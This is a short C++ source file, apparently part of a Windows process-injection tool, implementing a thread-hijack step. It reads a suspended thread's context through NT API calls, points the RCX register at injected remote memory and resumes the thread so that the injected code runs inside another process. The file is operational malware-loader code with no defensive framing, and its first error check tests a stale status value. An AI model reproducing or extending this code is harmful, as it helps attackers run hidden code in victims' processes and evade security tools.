#include "phases/execute/hijack.h"
#include "debug.h"
#include <cstdio>

BOOL Execute_Hijack(INJECT_CTX* ctx) {
    DBG("Execute_Hijack");

    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_INTEGER;

    ctx->api.ntGetContextThread(ctx->hThread, &context);
    if (!NT_SUCCESS(ctx->lastStatus)) {
        DBG("Failed to get thread context. NTSTATUS: 0x%08X", ctx->lastStatus);
        return FALSE;
    }

    context.Rcx = (DWORD64)ctx->remoteBase;
    DBG("Setting RCX to 0x%p", ctx->remoteBase);

    ctx->lastStatus = ctx->api.ntSetContextThread(ctx->hThread, &context);
    if (!NT_SUCCESS(ctx->lastStatus)) {
        DBG("Failed to set thread context. NTSTATUS: 0x%08X", ctx->lastStatus);
        return FALSE;
    }
    DBG("Set thread context.");

    ctx->lastStatus = ctx->api.ntResumeThread(ctx->hThread, NULL);
    if (!NT_SUCCESS(ctx->lastStatus)) {
        DBG("Failed to resume thread. NTSTATUS: 0x%08X", ctx->lastStatus);
        return FALSE;
    }

    DBG("Thread resumed");
    return TRUE;
}
